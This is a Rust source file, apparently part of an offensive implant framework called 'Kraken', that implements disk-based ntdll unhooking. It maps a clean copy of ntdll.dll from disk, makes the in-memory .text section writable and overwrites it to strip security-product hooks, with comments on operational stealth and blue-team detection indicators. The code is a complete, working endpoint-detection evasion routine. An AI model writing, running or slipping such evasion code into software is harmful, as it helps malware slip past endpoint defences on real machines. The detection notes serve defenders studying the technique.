//! Disk-based ntdll unhooking
//!
//! Loads a fresh copy of ntdll.dll from disk and overwrites the hooked
//! .text section with the clean version.
//!
//! ## OPSEC Considerations
//! - Creates file access artifacts (ntdll.dll read)
//! - VirtualProtect calls on ntdll are logged
//! - Less stealthy than KnownDlls method
//!
//! ## Detection (Blue Team)
//! - File access to C:\Windows\System32\ntdll.dll from non-system process
//! - CreateFileMapping on ntdll.dll
//! - VirtualProtect changing ntdll .text to RWX then back to RX

use super::pe::{find_text_section, get_module_base};
use super::UnhookResult;
use common::KrakenError;

#[cfg(target_os = "windows")]
use windows_sys::Win32::{
    Foundation::{CloseHandle, GENERIC_READ, HANDLE, INVALID_HANDLE_VALUE},
    Storage::FileSystem::{
        CreateFileA, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ, OPEN_EXISTING,
    },
    System::Memory::{
        CreateFileMappingA, MapViewOfFile, UnmapViewOfFile, VirtualProtect,
        FILE_MAP_READ, PAGE_EXECUTE_READWRITE, PAGE_READONLY,
    },
};

/// Path to ntdll.dll on disk
#[cfg(target_os = "windows")]
const NTDLL_PATH: &[u8] = b"C:\\Windows\\System32\\ntdll.dll\0";

/// Unhook ntdll by loading fresh copy from disk
#[cfg(target_os = "windows")]
pub fn unhook_from_disk() -> Result<UnhookResult, KrakenError> {
    unsafe {
        // 1. Get base address of hooked ntdll
        let hooked_ntdll = get_module_base("ntdll.dll")
            .ok_or_else(|| KrakenError::Module("failed to get ntdll base".into()))?;

        // 2. Find .text section in hooked ntdll
        let text_section = find_text_section(hooked_ntdll)
            .ok_or_else(|| KrakenError::Module("failed to find .text section".into()))?;

        let hooked_text_addr = hooked_ntdll.add(text_section.virtual_address as usize);
        let text_size = text_section.virtual_size as usize;

        // 3. Open fresh ntdll from disk
        let file_handle = CreateFileA(
            NTDLL_PATH.as_ptr(),
            GENERIC_READ,
            FILE_SHARE_READ,
            std::ptr::null(),
            OPEN_EXISTING,
            FILE_ATTRIBUTE_NORMAL,
            0,
        );

        if file_handle == INVALID_HANDLE_VALUE {
            return Err(KrakenError::Module("failed to open ntdll.dll".into()));
        }

        // 4. Create file mapping
        let mapping_handle = CreateFileMappingA(
            file_handle,
            std::ptr::null(),
            PAGE_READONLY,
            0,
            0,
            std::ptr::null(),
        );

        if mapping_handle == 0 {
            CloseHandle(file_handle);
            return Err(KrakenError::Module("failed to create file mapping".into()));
        }

        // 5. Map view of file
        let fresh_ntdll = MapViewOfFile(mapping_handle, FILE_MAP_READ, 0, 0, 0);

        if fresh_ntdll.is_null() {
            CloseHandle(mapping_handle);
            CloseHandle(file_handle);
            return Err(KrakenError::Module("failed to map ntdll".into()));
        }

        // 6. Find .text section in fresh ntdll
        let fresh_text_section = find_text_section(fresh_ntdll as *const u8)
            .ok_or_else(|| {
                cleanup_handles(fresh_ntdll, mapping_handle, file_handle);
                KrakenError::Module("failed to find .text in fresh ntdll".into())
            })?;

        // For disk-mapped files, use raw_data_offset
        let fresh_text_addr =
            (fresh_ntdll as *const u8).add(fresh_text_section.raw_data_offset as usize);

        // 7. Make hooked .text writable
        let mut old_protect: u32 = 0;
        let protect_result = VirtualProtect(
            hooked_text_addr as *mut _,
            text_size,
            PAGE_EXECUTE_READWRITE,
            &mut old_protect,
        );

        if protect_result == 0 {
            cleanup_handles(fresh_ntdll, mapping_handle, file_handle);
            return Err(KrakenError::Module("failed to change memory protection".into()));
        }

        // 8. Copy fresh .text over hooked .text
        std::ptr::copy_nonoverlapping(
            fresh_text_addr,
            hooked_text_addr as *mut u8,
            text_size,
        );

        // 9. Restore original protection
        let mut temp_protect: u32 = 0;
        VirtualProtect(
            hooked_text_addr as *mut _,
            text_size,
            old_protect,
            &mut temp_protect,
        );

        // 10. Cleanup
        cleanup_handles(fresh_ntdll, mapping_handle, file_handle);

        Ok(UnhookResult {
            method: "disk".into(),
            success: true,
            bytes_restored: text_size,
            message: format!(
                "restored {} bytes of ntdll .text section from disk",
                text_size
            ),
        })
    }
}

#[cfg(target_os = "windows")]
unsafe fn cleanup_handles(view: *const core::ffi::c_void, mapping: HANDLE, file: HANDLE) {
    if !view.is_null() {
        UnmapViewOfFile(view);
    }
    if mapping != 0 {
        CloseHandle(mapping);
    }
    if file != INVALID_HANDLE_VALUE && file != 0 {
        CloseHandle(file);
    }
}

#[cfg(not(target_os = "windows"))]
pub fn unhook_from_disk() -> Result<UnhookResult, KrakenError> {
    Err(KrakenError::Module(
        "disk unhooking only supported on Windows".into(),
    ))
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    #[cfg(not(target_os = "windows"))]
    fn test_unhook_fails_on_non_windows() {
        let result = unhook_from_disk();
        assert!(result.is_err());
    }

    #[test]
    fn test_ntdll_path() {
        #[cfg(target_os = "windows")]
        {
            let path_str = std::str::from_utf8(&NTDLL_PATH[..NTDLL_PATH.len() - 1]).unwrap();
            assert!(path_str.contains("ntdll.dll"));
        }
    }
}
